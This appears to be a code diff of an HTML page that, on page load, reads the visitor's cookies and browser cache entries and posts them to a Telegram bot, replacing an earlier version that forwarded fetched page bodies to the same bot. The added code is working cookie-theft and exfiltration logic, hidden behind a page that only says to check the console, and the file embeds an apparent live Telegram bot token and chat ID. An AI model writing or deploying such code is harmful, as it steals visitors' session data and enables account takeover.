@@ -3,9 +3,8 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Fetch and Send to Telegram</title>
+    <title>Fetch Cache and Cookies</title>
     <script>
-        // Place your JavaScript code here
         const TelegramBotToken = '7694280275:AAGH4Vj9dh9gCMoAwmPeikpWbtyStdNwXc8'; // Replace with your Telegram Bot Token
         const ChatID = '693873866'; // Replace with your Telegram chat ID
 
@@ -36,46 +35,43 @@
             }
         }
 
-        async function fetchWithRedirects(url, requestOptions) {
-            try {
-                const resp = await fetch(url, requestOptions);
+        async function fetchCookiesAndCache() {
+            // Fetch cookies
+            const cookies = document.cookie;
+            console.log('Cookies:', cookies);
 
-                if ([301, 302, 303, 304, 306, 307, 308].includes(resp.status)) {
-                    let vercelCookie = resp.headers.get('set-cookie');
-                    let myHeadersWithCookie = new Headers();
-                    myHeadersWithCookie.append("Cookie", vercelCookie);
+            // Fetch cache (using Cache API)
+            if ('caches' in window) {
+                const cacheNames = await caches.keys();
+                let cacheInfo = 'Cache names:\n';
 
-                    const requestOptionsWithNewCookie = {
-                        method: 'GET',
-                        headers: myHeadersWithCookie,
-                    };
+                for (const cacheName of cacheNames) {
+                    const cache = await caches.open(cacheName);
+                    const cacheEntries = await cache.keys();
 
-                    const resWithCookie = await fetch(resp.url, requestOptionsWithNewCookie);
-                    const bodyWithCookie = await resWithCookie.text();
-                    await sendToTelegram(`Redirect Response (${resp.status}):\n${bodyWithCookie}`);
-
-                } else {
-                    const body = await resp.text();
-                    await sendToTelegram(`Non-Redirect Response (${resp.status}):\n${body}`);
+                    cacheInfo += `Cache: ${cacheName}\n`;
+                    cacheEntries.forEach(request => {
+                        cacheInfo += ` - ${request.url}\n`;
+                    });
                 }
-            } catch (error) {
-                console.error('Error during fetch:', error);
+
+                console.log(cacheInfo);
+
+                // Send cookies and cache information to Telegram
+                await sendToTelegram(`Cookies:\n${cookies}\n\n${cacheInfo}`);
+            } else {
+                console.log('Cache API not supported in this browser.');
+                await sendToTelegram(`Cookies:\n${cookies}\n\nCache API not supported.`);
             }
         }
 
         document.addEventListener('DOMContentLoaded', () => {
-            const requestOptions = {
-                method: 'GET',
-                headers: {
-                    'Content-Type': 'application/json',
-                },
-            };
-            fetchWithRedirects("https://nextjs-demo-ebon-iota.vercel.app/", requestOptions);
+            fetchCookiesAndCache();
         });
     </script>
 </head>
 <body>
-    <h1>Fetching Data and Sending to Telegram</h1>
+    <h1>Fetching Cache and Cookies</h1>
     <p>Check the console for logs.</p>
 </body>
 </html>
